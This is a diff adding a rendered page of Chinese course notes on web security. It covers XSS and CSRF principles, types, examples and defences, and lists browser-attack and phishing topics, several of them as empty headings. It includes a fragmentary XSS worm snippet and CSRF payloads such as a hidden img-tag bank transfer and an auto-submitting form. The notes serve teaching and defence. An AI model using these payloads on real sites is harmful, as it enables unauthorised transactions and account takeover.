+<li>场景：URL 参数 / Hash 值处理、<code>localStorage</code>/<code>sessionStorage</code>本地存储数据处理、 页面交互元素、第三方数据 / 接口返回数据</li>
+</ul>
+<h4 id="xss_3">XSS 攻击实例<a class="headerlink" href="#xss_3" title="Permanent link">&para;</a></h4>
+<ul>
+<li>
+<p>编写实现 XSS 蠕虫</p>
+</li>
+<li>
+<p>链接方法</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/javascript&quot;</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://www.example.com/xss_worm.js&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>DOM 方法</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;worm&quot;</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">headerTag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span><span class="p">;</span><span class="w"> </span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">jsCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;worm&quot;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">tailTag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;/&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;script&gt;&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">wormCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">headerTag</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">jsCode</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">tailTag</span><span class="p">);</span><span class="w"> </span>
+<span class="w">    </span><span class="nx">alert</span><span class="p">(</span><span class="nx">jsCode</span><span class="p">);</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+<h4 id="xss_4">XSS 攻击防范措施<a class="headerlink" href="#xss_4" title="Permanent link">&para;</a></h4>
+<ul>
+<li>服务器端防范措施</li>
+<li>
+<p>输入验证：用户输入数据不是过长、仅包含某些合法字符、不能包含某些 HTML 与 JavaScript 关键标签符号、数据与一个特殊的正规表达式相匹配等</p>
+</li>
+<li>
+<p>输出净化：Web 应用程序对提交到响应页面的用户提交数据进行 HTML 编码，用对应的 HTML 实体替代字面量字符</p>
+</li>
+<li>
+<p>消除危险的输入点：尽量避免直接在现有的 JavaScript 中插入用户可控制的数据</p>
+</li>
+<li>
+<p>启用 Content-Security-Policy（CSP）</p>
+<ul>
+<li>
+<p>通过 HTTP 响应头（<code>Content-Security-Policy</code>）或 <code>&lt;meta&gt;</code> 标签，限制页面可执行的脚本来源（如仅允许自身域名 <code>'self'</code>、可信 CDN），禁止内联脚本（<code>'unsafe-inline'</code>）和 <code>eval()</code> 等危险函数。</p>
+</li>
+<li>
+<p>例：即使注入恶意脚本，也会因来源不被允许而无法执行</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code>Header set Content-Security-Policy &quot; \
+  default-src &#39;self&#39;; \
+  script-src &#39;self&#39; &#39;nonce-111-111-111&#39; *.example70.com \
+  &quot;
+</code></pre></div>
+</li>
+<li>
+<p>客户端防范措施</p>
+</li>
+<li>提高浏览器访问非受信网站时的安全等级</li>
+<li>关闭 Cookie 功能或设置 Cookie 只读</li>
+</ul>
+<h3 id="xsrf">XSRF 跨站请求伪造攻击<a class="headerlink" href="#xsrf" title="Permanent link">&para;</a></h3>
+<h4 id="xsrf_1">XSRF 攻击技术原理<a class="headerlink" href="#xsrf_1" title="Permanent link">&para;</a></h4>
+<h4 id="xsrf_2">XSRF 攻击类型<a class="headerlink" href="#xsrf_2" title="Permanent link">&para;</a></h4>
+<h4 id="xsrf_3">XSRF 攻击实例<a class="headerlink" href="#xsrf_3" title="Permanent link">&para;</a></h4>
+<h4 id="xsrf_4">XSRF 攻击防范措施<a class="headerlink" href="#xsrf_4" title="Permanent link">&para;</a></h4>
+<h3 id="xsrf_5">XSRF 跨站请求伪造攻击<a class="headerlink" href="#xsrf_5" title="Permanent link">&para;</a></h3>
+<h4 id="xsrf_6">XSRF 攻击技术原理<a class="headerlink" href="#xsrf_6" title="Permanent link">&para;</a></h4>
+<p>利用用户在目标网站已建立的合法会话（如登录状态），诱导用户在不知情的情况下向目标网站发送恶意请求，从而以用户的身份执行未授权操作。其攻击链路依赖于三个关键前提和特定的执行逻辑：</p>
+<p>首先，攻击的前置条件包括：用户已成功登录目标网站并保持有效会话（会话信息通常以 Cookie、Session ID 或令牌等形式存储在浏览器中）；用户在会话有效期内访问了攻击者精心构造的恶意页面（如钓鱼网站、包含恶意代码的第三方页面）；目标网站未对请求的合法性进行严格校验，仅通过会话信息确认用户身份。</p>
+<p>攻击的执行流程通常为：攻击者分析目标网站的关键操作接口（如转账、修改密码、提交订单等），了解其请求方式（GET/POST）、参数格式和提交路径；随后构造包含恶意请求的页面，该页面可能通过图片标签、表单自动提交、JavaScript 脚本等方式，在用户访问时自动向目标网站发送请求；由于浏览器会在请求中自动携带目标网站的会话 Cookie，目标网站会误认为该请求是用户主动发起的合法操作，进而执行恶意请求中的指令，导致用户权益受损。</p>
+<h4 id="xsrf_7">XSRF 攻击类型<a class="headerlink" href="#xsrf_7" title="Permanent link">&para;</a></h4>
+<ul>
+<li>GET 型 XSRF 攻击：</li>
+<li>原理：利用 GET 请求的特性（参数直接拼接在 URL 中）构造恶意链接或资源引用。攻击者通常将恶意请求伪装成图片、链接、iframe 等元素，当用户访问包含这些元素的页面时，浏览器会自动发送 GET 请求。由于 GET 请求一般用于获取资源，部分开发者可能未对其执行的敏感操作进行严格校验，从而导致攻击成功。</li>
+<li>例如，某银行转账接口为 GET 方式，URL 格式为 <code>http://bank.com/transfer?to=attacker&amp;amount=1000</code>，攻击者构造包含 <code>&lt;img src="http://bank.com/transfer?to=attacker&amp;amount=1000" width="0" height="0"&gt;</code> 的恶意页面，用户登录银行后访问该页面，浏览器会自动加载图片并发送转账请求。</li>
+<li>POST 型 XSRF 攻击：</li>
+<li>原理：POST 型攻击相较于 GET 型更具隐蔽性，因为其请求参数包含在请求体中，不直接暴露在 URL 中。攻击者通常通过构造自动提交的表单来发起攻击，利用 JavaScript 脚本在页面加载时触发表单提交，或者诱导用户点击按钮提交表单。由于 POST 请求常被用于提交敏感数据，若网站仅依赖会话验证身份，未对请求来源进行校验，同样会面临风险。</li>
+<li>例如，某论坛修改密码的接口为 POST 方式，需要提交“原密码”“新密码”等参数。攻击者构造一个包含隐藏表单的页面，表单 action 指向论坛修改密码接口，参数中“新密码”设为攻击者指定的值，同时通过 JavaScript 代码 <code>window.onload = function() { document.getElementById("evilForm").submit(); }</code> 实现页面加载后自动提交，用户登录论坛后访问该页面即会触发密码修改操作。</li>
+<li>基于 Cookie 的 XSRF 攻击</li>
+<li>原理：该类型攻击利用浏览器对 Cookie 的携带规则，尤其是非 HttpOnly 或未设置 SameSite 属性的 Cookie。若目标网站的会话 Cookie 未设置 HttpOnly 标志，攻击者可通过 JavaScript 脚本读取 Cookie 信息并构造请求；若未设置 SameSite 属性，浏览器会在跨站请求中携带 Cookie，为攻击提供便利。此外，部分网站可能使用 Cookie 直接传递操作参数，攻击者可通过篡改 Cookie 或利用 Cookie 中的信息构造恶意请求。</li>
+</ul>
+<h4 id="xsrf_8">XSRF 攻击实例<a class="headerlink" href="#xsrf_8" title="Permanent link">&para;</a></h4>
+<h5 id="_59">实例一：电商网站订单篡改攻击<a class="headerlink" href="#_59" title="Permanent link">&para;</a></h5>
+<p>场景：某电商网站存在订单确认接口，采用 GET 方式请求，URL 格式为 <code>http://ecommerce.com/confirmOrder?orderId=12345&amp;payAmount=999</code>，用户登录后点击“确认支付”按钮会发送该请求，网站仅通过会话 Cookie 验证用户身份。</p>
+<p>攻击过程：攻击者通过分析该接口，发现可通过修改 <code>payAmount</code> 参数篡改支付金额。随后，攻击者构造恶意链接 <code>http://ecommerce.com/confirmOrder?orderId=12345&amp;payAmount=1</code>，并将其伪装成“限时优惠领取”链接，通过邮件、论坛私信等方式发送给已登录该电商网站的用户。当用户点击该链接时，浏览器会自动发送包含篡改后金额的确认支付请求，网站验证会话有效后，执行支付操作，导致用户以 1 元的价格支付了原价值 999 元的订单，电商网站遭受经济损失。</p>
+<h5 id="_60">实例二：社交平台账号权限篡改攻击<a class="headerlink" href="#_60" title="Permanent link">&para;</a></h5>
+<p>场景：某社交平台提供“添加管理员”功能，对应的 POST 接口为 <code>http://social.com/addAdmin</code>，请求参数为 <code>userId=攻击者ID</code>，用户登录后提交表单即可将指定用户设为账号管理员。该平台未对请求来源进行校验，仅通过会话验证用户身份。</p>
+<p>攻击过程：攻击者构造一个恶意 HTML 页面，页面中包含一个隐藏表单，表单 action 指向 <code>http://social.com/addAdmin</code>，method 设为 POST，表单内包含 <code>&lt;input type="hidden" name="userId" value="攻击者ID"&gt;</code> 的隐藏参数。同时，页面中加入 JavaScript 代码实现页面加载后自动提交表单。攻击者将该页面部署在自己的服务器上，并通过“查看精彩内容”等诱导性文案，吸引已登录社交平台的用户访问该页面。用户访问后，浏览器自动提交表单，社交平台验证会话有效后，将攻击者设为账号管理员，攻击者随后可利用管理员权限窃取账号内的隐私信息、发布恶意内容等。</p>
+<h4 id="xsrf_9">XSRF 攻击防范措施<a class="headerlink" href="#xsrf_9" title="Permanent link">&para;</a></h4>
+<ul>
+<li>使用 CSRF Token 校验</li>
+<li>
+<p>这是目前最主流且有效的防范手段，核心原理是为每个用户会话生成一个唯一的、随机的 CSRF Token（令牌），并在请求中携带该 Token，服务器通过校验 Token 的有效性来判断请求是否合法。具体实现步骤为：服务器在用户登录后，生成一个随机的 CSRF Token，将其存储在用户的会话中，并通过页面渲染（如隐藏表单字段、HTML 头部标签）传递给前端；前端在发起敏感请求（如 POST、PUT、DELETE 等）时，必须将该 Token 作为参数或请求头的一部分发送给服务器；服务器接收请求后，从会话中获取当前用户的 CSRF Token，与请求中携带的 Token 进行对比，若不一致或 Token 不存在，则拒绝执行请求。由于 CSRF Token 是随机且与用户会话绑定的，攻击者无法提前获取，因此无法构造有效的恶意请求。</p>
+</li>
+<li>
+<p>校验请求来源（Referer/Origin 头）</p>
+</li>
+<li>
+<p>利用 HTTP 协议中的 Referer 头和 Origin 头判断请求的来源是否合法。Referer 头记录了请求发起的页面 URL，Origin 头记录了请求发起的域名（不包含具体路径）。服务器在接收敏感请求时，校验 Referer 或 Origin 头中的域名是否为信任的域名（即自身网站域名），若不是则拒绝请求。需要注意的是，Referer 头可能被浏览器或插件篡改、删除，存在一定的安全隐患，因此建议优先使用 Origin 头（仅在跨站请求中存在），并结合其他防范措施。对于 GET 请求，由于其易被构造，建议尽量避免使用 GET 方式执行敏感操作，从根本上降低风险。</p>
+</li>
+<li>
+<p>设置 Cookie 的 SameSite 属性</p>
+</li>
+<li>
+<p>通过为会话 Cookie 设置 SameSite 属性，限制浏览器在跨站请求中携带 Cookie，从源头阻止攻击利用 Cookie 进行身份验证。SameSite 属性有三个可选值：Strict（严格模式），浏览器仅在同站请求中携带 Cookie，跨站请求（即使是用户主动点击的链接）也不携带；Lax（宽松模式），比 Strict 模式更灵活，允许用户主动点击链接、提交表单等跨站请求携带 Cookie，但禁止通过图片、脚本等被动方式发起的跨站请求携带 Cookie；None（无限制），浏览器在所有请求中都携带 Cookie，但需配合 Secure 属性（仅在 HTTPS 协议下生效）使用。建议将敏感操作对应的 Cookie 设置为 Strict 或 Lax 模式，有效阻止跨站请求携带 Cookie。</p>
+</li>
+<li>
+<p>其他辅助防范措施</p>
+</li>
+<li>除上述核心措施外，还可通过以下方式增强防护能力：一是采用 HTTP 方法的语义化使用，严格区分 GET 和 POST 等方法的用途，GET 方法仅用于获取资源，不执行任何状态修改或敏感操作，从根本上避免 GET 型 XSRF 攻击；二是实施二次验证，对于转账、修改密码、添加管理员等高危操作，要求用户再次输入密码、验证码或通过手机短信验证等方式，确认用户的操作意图，即使恶意请求通过了前期校验，也能被二次验证拦截；三是使用 HttpOnly Cookie，将会话 Cookie 设置为 HttpOnly 标志，防止攻击者通过 JavaScript 脚本读取 Cookie 信息，避免基于 Cookie 的 XSRF 攻击与 XSS 攻击结合造成更大危害。</li>
+</ul>
+<h3 id="shellshock">Shellshock 攻击<a class="headerlink" href="#shellshock" title="Permanent link">&para;</a></h3>
+<h2 id="web_11">Web 浏览器安全攻防<a class="headerlink" href="#web_11" title="Permanent link">&para;</a></h2>
+<h3 id="web_12">Web 浏览的安全威胁<a class="headerlink" href="#web_12" title="Permanent link">&para;</a></h3>
+<h4 id="web_13">Web 浏览器软件的安全困境三要素<a class="headerlink" href="#web_13" title="Permanent link">&para;</a></h4>
+<ul>
+<li>复杂性：代码量大漏洞多</li>
+<li>可扩展性：插件开发缺乏安全保证，插件不具备自动版本更新的机制</li>
+<li>连通性：始终联网易被网络上的威胁源所攻击利用</li>
+</ul>
+<h4 id="web_14">Web 浏览安全威胁位置<a class="headerlink" href="#web_14" title="Permanent link">&para;</a></h4>
+<ul>
+<li>针对传输网络的网络协议安全威胁</li>
+<li>针对 Web 浏览端系统平台的安全威胁</li>
+<li><strong>针对 Web 浏览器软件及插件程序的渗透攻击威胁</strong> </li>
+<li><strong>针对互联网用户的社会工程学攻击威胁</strong></li>
+</ul>
+<h3 id="web_15">Web 浏览端的渗透攻击威胁——网页木马<a class="headerlink" href="#web_15" title="Permanent link">&para;</a></h3>
+<h4 id="_61">网页木马的机理分析<a class="headerlink" href="#_61" title="Permanent link">&para;</a></h4>
+<ul>
+<li>网页木马的定义特性：针对 Web 浏览器软件进行客户端渗透攻击的恶意移动代码，利用了现代 Web 浏览器软件中所支持的客户端脚本执行能力，通常以 JavaScript、VBScript 实现，或以 Flash、PDF等恶意构造的 Web 文件形式存在。</li>
+<li>网页挂马机制//</li>
+<li>混淆机制</li>
+</ul>
+<h4 id="_62">网页木马的检测与分析技术<a class="headerlink" href="#_62" title="Permanent link">&para;</a></h4>
+<ul>
+<li>基于特征码匹配的传统检测方法</li>
+<li>基于统计与机器学习的静态分析方法</li>
+<li>基于动态行为结果判定的监测分析方法</li>
+<li>基于模拟浏览器环境的动态分析检测方法</li>
+</ul>
+<h4 id="_63">网页木马防范措施<a class="headerlink" href="#_63" title="Permanent link">&para;</a></h4>
+<h3 id="_64">网络钓鱼<a class="headerlink" href="#_64" title="Permanent link">&para;</a></h3>
+<h4 id="_65">网络钓鱼技术概述<a class="headerlink" href="#_65" title="Permanent link">&para;</a></h4>
+<h4 id="_66">网络钓鱼攻击场景案例<a class="headerlink" href="#_66" title="Permanent link">&para;</a></h4>
+<h4 id="_67">网络钓鱼攻击技术策略<a class="headerlink" href="#_67" title="Permanent link">&para;</a></h4>
+<h4 id="_68">网络钓鱼攻击的防范<a class="headerlink" href="#_68" title="Permanent link">&para;</a></h4>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.sections", "toc.integrate", "navigation.top", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+    
+  </body>
+</html>
